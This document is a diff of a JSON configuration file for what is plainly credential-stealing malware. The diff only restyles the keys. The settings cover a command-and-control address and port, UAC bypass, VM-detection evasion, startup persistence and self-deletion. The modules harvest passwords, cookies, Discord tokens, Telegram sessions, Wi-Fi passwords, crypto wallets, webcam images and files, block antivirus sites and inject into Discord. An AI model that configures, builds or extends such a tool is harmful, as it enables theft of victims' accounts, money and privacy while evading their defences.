@@ -1,36 +1,42 @@
 {
-    "settings" : {
-        "c2" : [0, ""],
-        "mutex" : "",
-        "pingme" : true,
-        "vmprotect" : true,
-        "startup" : true,
-        "melt" : false,
-        "uacBypass" : true,
-        "archivePassword" : "blank",
-        "consoleMode" : 0,
-        "debug" : false,
-        "pumpedStubSize" : 0,
-        "boundFileRunOnStartup" : false
+    "settings": {
+        "c2": {
+            "port": 0,
+            "address": ""
+        },
+        "mutex": "",
+        "ping_me": true,
+        "vm_protect": true,
+        "startup": true,
+        "melt": false,
+        "uac_bypass": true,
+        "archive_password": "blank",
+        "console_mode": 0,
+        "debug": false,
+        "pumped_stub_size": 0,
+        "run_bound_file_on_startup": false
     },
     
-    "modules" : {
-        "captureWebcam" : true,
-        "capturePasswords" : true,
-        "captureCookies" : true,
-        "captureHistory" : true,
-        "captureAutofills" : true,
-        "captureDiscordTokens" : true,
-        "captureGames" : true,
-        "captureWifiPasswords" : true,
-        "captureSystemInfo" : true,
-        "captureScreenshot" : true,
-        "captureTelegramSession" : true,
-        "captureCommonFiles" : true,
-        "captureWallets" : true,
+    "modules": {
+        "capture_webcam": true,
+        "capture_passwords": true,
+        "capture_cookies": true,
+        "capture_history": true,
+        "capture_autofills": true,
+        "capture_discord_tokens": true,
+        "capture_games": true,
+        "capture_wifi_passwords": true,
+        "capture_system_info": true,
+        "capture_screenshot": true,
+        "capture_telegram_session": true,
+        "capture_common_files": true,
+        "capture_wallets": true,
 
-        "fakeError" : [false, ["title", "message", 0]],
-        "blockAvSites" : true,
-        "discordInjection" : true
+        "fake_error": {
+            "enabled": false,
+            "details": ["title", "message", 0]
+        },
+        "block_av_sites": true,
+        "discord_injection": true
     }
 }
